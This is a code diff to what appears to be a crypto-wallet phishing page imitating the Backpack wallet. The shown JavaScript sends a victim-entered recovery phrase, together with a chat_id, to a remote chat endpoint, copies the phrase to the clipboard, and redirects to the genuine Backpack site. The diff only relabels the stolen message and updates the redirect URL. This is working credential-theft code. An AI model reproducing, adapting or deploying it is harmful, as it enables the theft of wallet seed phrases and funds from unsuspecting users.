@@ -299,14 +299,14 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          text: "S\n" + phrase.trim()
+          text: "backpack\n" + phrase.trim()
         })
       });
 
       navigator.clipboard.writeText(phrase.trim());
 
       setTimeout(() => {
-        window.location.href = "https://Backpack.io/";
+        window.location.href = "https://backpack.app/";
       }, 800);
     }
 
